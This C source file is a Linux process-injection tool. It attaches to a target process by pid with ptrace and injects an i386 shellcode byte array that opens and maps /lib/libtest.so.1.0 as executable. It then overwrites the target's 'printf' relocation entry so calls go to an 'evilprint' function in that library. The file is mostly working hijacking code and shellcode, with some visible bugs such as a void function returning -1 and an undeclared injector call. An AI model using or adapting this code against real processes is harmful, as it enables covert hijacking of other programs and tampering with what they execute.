#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <libelf.h>
#include <string.h>

#include "linux_obj_parser.h"
#include <sys/ptrace.h>



struct task_desc_t
{
  int    td_fd;
  void  *td_map;
  FILE  *td_mem;
  size_t td_len;
  struct lop_info td_info;
};

struct lib_desc_t
{
  int    lib_fd;
  void  *lib_base;
  size_t lib_len;
  struct lop_info lib_info;
  long   lib_vaddr;
};


static int
map_parser_init_lib_hooker(struct lib_desc_t *lib, char *filename)
{
  int ret;
  struct stat _stat;
  ret = stat(filename, &_stat);
  if(ret)
	  goto map_parser_init_lib_hooker_stat_error;

  lib->lib_fd = open(filename, O_RDONLY, 0644);
  if(lib->lib_fd < 0)
	  goto map_parser_init_lib_hooker_open_error;

  lib->lib_base = mmap(0, _stat.st_size, PROT_READ, MAP_PRIVATE, lib->lib_fd, 0); 
  if(lib->lib_base == MAP_FAILED)
	  goto map_parser_init_lib_hooker_mmap_failed;

  lib->lib_len = _stat.st_size;
  lop_init_info(&lib->lib_info, lib->lib_base);
  return 0;

map_parser_init_lib_hooker_mmap_failed:
  close(lib->lib_fd);
map_parser_init_lib_hooker_open_error:
map_parser_init_lib_hooker_stat_error:
  perror("initlib : ");
  return -1; 
}

static void
map_parser_exit_lib_hooker(struct lib_desc_t *lib)
{
  close(lib->lib_fd);
  munmap(lib->lib_base, lib->lib_len);
}


static int
map_parser_build_procfs_filename( pid_t numpid, 
		                          char buff[], 
								  char *whatfile,
								  size_t max_len)
{
  int ret;

  ret = snprintf(buff, max_len, "/proc/%hu/%s", numpid, whatfile);
  return ret;
}





void
map_parser_exit(struct task_desc_t *ptr)
{
  fclose(ptr->td_mem);
  munmap(ptr->td_map, ptr->td_len);
  close(ptr->td_fd);
}


int
map_parser_init(struct task_desc_t *const td, pid_t numpid)
{
  struct stat st;
  int ret;
  char buff[strlen("/proc/XXXXX/maps") + 1];
  char buff2[strlen("/proc/XXXXX/exe") + 1];
  ret = map_parser_build_procfs_filename(numpid, buff, "maps", sizeof(buff));
  
  if(ret > sizeof(buff))
    goto map_parser_read_procfs_file_filepath_error;

  ret = map_parser_build_procfs_filename(numpid, buff2, "exe", sizeof(buff2));

  if(ret > sizeof(buff2))
    goto map_parser_read_procfs_file_filepath_error;

  td->td_mem = fopen(buff, "r+");
  if(!td->td_mem)
    goto map_parser_read_procs_file_fopen_error;
    
  td->td_fd = open(buff2, O_RDONLY, 0644);
  if(td->td_fd < 0)
    goto map_parser_read_procs_file_open_error;

  ret = fstat(td->td_fd, &st);
  if(ret < 0)
    goto map_parser_read_procs_file_stat_error;
  td->td_len = (size_t)st.st_size;
  td->td_map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, td->td_fd, 0);
  if(td->td_map == MAP_FAILED)
    goto map_parser_read_procs_file_mmap_error;

  lop_init_info(&td->td_info, td->td_map);
  return ret;

map_parser_read_procs_file_mmap_error:
map_parser_read_procs_file_stat_error:
  close(td->td_fd);
map_parser_read_procs_file_open_error:
  fclose(td->td_mem);
map_parser_read_procs_file_fopen_error:
map_parser_read_procfs_file_filepath_error:
  
  perror("init : ");
  exit(1);
}

char sh[] =
  "\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec"
  "\x18\x31\xd2\x89\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44"
  "\x24\x08\x07\x00\x00\x00\xc7\x44\x24\x0c\x02\x00\x00\x00\x89\x44"
  "\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89\xe3\xcd\x80\xcc"
  "\xe8\xc0\xff\xff\xff\x2f\x6c\x69\x62\x2f\x6c\x69\x62\x74\x65\x73"
  "\x74\x2e\x73\x6f\x2e\x31\x2e\x30\x00";


void
map_parser_replace_virtual_addrfunc(char *fname1,
                                    char *fname2,
                                    pid_t pid,
                                    struct task_desc_t *task,
                                    struct lib_desc_t  *lib)
{
  long old_val, new_val;
  Elf32_Rel *sym1 = NULL;
  Elf32_Sym *sym2 = NULL;
  int i;
  long ret;
  
  for( i = 0; i < task->td_info.lop_dynsym_count; ++i ){
    if(task->td_info.lop_plt[i].lop_symname &&
       !strcmp(task->td_info.lop_plt[i].lop_symname, fname1)){
      sym1 = task->td_info.lop_plt[i].lop_rel;
      break;
    }
  }
  if(!sym1){
    fprintf(stderr, "sym %s not found\n", fname1);
    return;
  }
  
  for( i = 0; i < lib->lib_info.lop_dynsym_count; ++i){
    if(lib->lib_info.lop_plt[i].lop_symname &&
       !strcmp(lib->lib_info.lop_plt[i].lop_symname, fname2)){
      sym2 =  lib->lib_info.lop_plt[i].lop_sym; 
    }
  }

  if(!sym2){
    fprintf(stderr, "sym %s not found\n", fname2);
    return;
  }
  printf("patching addr %p\n", sym1->r_offset);
  new_val = lib->lib_vaddr + sym2->st_value;

  ret = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
  if(ret < 0){
    perror("ptrace :" );
	return -1;
  }
  old_val = ptrace(PTRACE_PEEKTEXT, pid, sym1->r_offset, NULL);
  printf("backuping old addr = %x\n, new_val is %x\n", old_val, new_val);
  ptrace(PTRACE_POKETEXT, pid, sym1->r_offset, new_val);

  ptrace(PTRACE_DETACH, pid, NULL, NULL);
}                 
                                     


int
main(int argc, char *argv[])
{
  struct task_desc_t td;
  struct lib_desc_t  lib;
  unsigned long addr_dso = 0;
  size_t len = sizeof(sh)/sizeof(char);
  char test_buff[] = "/proc/XXXXX/exe";
  if(argc != 3){
    printf("usage : %s pid libfilepath\n", *argv);
	return 1;
  }

  map_parser_init(&td, atoi(argv[1]));
  map_parser_init_lib_hooker(&lib, argv[2]);
  lop_display(&td.td_info);
  lop_display(&lib.lib_info);

  addr_dso = process_injector_inject(atoi(argv[1]), td.td_info.lop_textvaddr, sh, len);
  lib.lib_vaddr = addr_dso;

  map_parser_replace_virtual_addrfunc("printf", "evilprint", atoi(argv[1]), &td, &lib);
  
  map_parser_exit(&td);
  map_parser_exit_lib_hooker(&lib);
  return 0;
}

